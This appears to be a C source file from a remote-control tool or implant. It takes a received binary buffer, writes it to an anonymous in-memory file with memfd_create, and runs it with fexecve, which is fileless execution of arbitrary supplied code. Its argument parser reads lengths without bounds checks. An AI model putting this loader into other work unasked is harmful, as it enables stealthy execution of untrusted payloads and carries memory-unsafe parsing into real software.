#define _GNU_SOURCE /* See feature_test_macros(7) */
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <linux/memfd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>

#include "shell.h"

unsigned char **parse_protocol_shell_argument_buffer(unsigned char *buf) {

  uint16_t argc = 0;

  if (buf != NULL) {
    argc = (uint16_t) * (buf);
  }

  uint16_t offset = sizeof(uint16_t);

  unsigned char **argv = calloc(argc + 1, sizeof(unsigned char *));

  for (uint16_t i = 0; i < argc; i++) {
    uint16_t arg_sz = (uint16_t) * (buf + offset);
    offset += sizeof(uint16_t);

    argv[i] = calloc(arg_sz + 1, sizeof(unsigned char));

    memcpy(argv[i], buf + offset, arg_sz);

    offset += arg_sz;
  }

  argv[argc] = NULL;

#ifdef DEBUG
  printf("Argument Buffer: \n");
  int i = 0;
  while (argv[i] != NULL) {
    printf("\targ[%d] = |||%s|||\n", i, argv[i]);
    i++;
  }
#endif

  return argv;
}

extern int protocol_shell(uint32_t method, unsigned char *buf,
                          uint32_t buf_size, unsigned char *argv_buf,
                          unsigned char *envp_buf) {

  unsigned char **argv = parse_protocol_shell_argument_buffer(argv_buf);
  unsigned char **envp = parse_protocol_shell_argument_buffer(envp_buf);

  // function table, would be nice - prob. break things out and clean this up
  // at somepoint...

  if (method == RTL_PROTOCOL_SHELL_METHOD_MEMFD) {
    int a = memfd_create("", 0);

    if (a == -1) {
#ifdef DEBUG
      perror("memfd_create");
#endif
      exit(EXIT_FAILURE);
    }

    if (ftruncate(a, buf_size) == -1) {
#ifdef DEBUG
      perror("ftruncate");
#endif
      exit(EXIT_FAILURE);
    }

    if (write(a, buf, buf_size) == -1) {
#ifdef DEBUG
      perror("write");
#endif
      exit(EXIT_FAILURE);
    }

    pid_t pid = fork();
    if (pid == 0) {

      if (fcntl(a, F_SETFL, O_RDONLY) == -1) {
#ifdef DEBUG
        perror("fcntl");
#endif
        exit(EXIT_FAILURE);
      }

      if (fexecve(a, (char *const *)argv, (char *const *)envp) == -1) {
#ifdef DEBUG
        perror("fexecve");
#endif
        exit(EXIT_FAILURE);
      }
    } else if (pid == -1) {
#ifdef DEBUG
      perror("fork");
#endif
      exit(EXIT_FAILURE);
    }

    if (wait(NULL) == -1) {
#ifdef DEBUG
      perror("wait");
#endif
      exit(EXIT_FAILURE);
    }

    return close(a);
  }

  if (method == RTL_PROTOCOL_SHELL_METHOD_TMPFS) {
#ifdef DEBUG
    perror("not implemented- yet...");
#endif
    exit(EXIT_FAILURE);
  }

  return EXIT_FAILURE;
}